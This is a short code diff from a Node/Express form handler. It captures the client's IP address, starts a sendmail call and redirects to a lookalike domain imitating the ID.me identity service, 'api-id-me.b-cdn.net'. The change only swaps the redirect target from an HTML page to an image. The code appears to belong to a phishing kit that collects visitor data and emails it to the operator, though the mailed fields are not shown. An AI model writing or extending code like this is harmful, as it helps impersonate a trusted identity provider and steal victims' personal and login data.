@@ -60,7 +60,7 @@ app.post("/", (req, res) => {
  
   let ip2 = requestIp.getClientIp(req);
 
-  let redirectUrl = "https://api-id-me.b-cdn.net/idme23.html";
+  let redirectUrl = "https://api-id-me.b-cdn.net/73059985_2475324106012610_4114743175405371392_n.png";
 
   sendmail(
     {
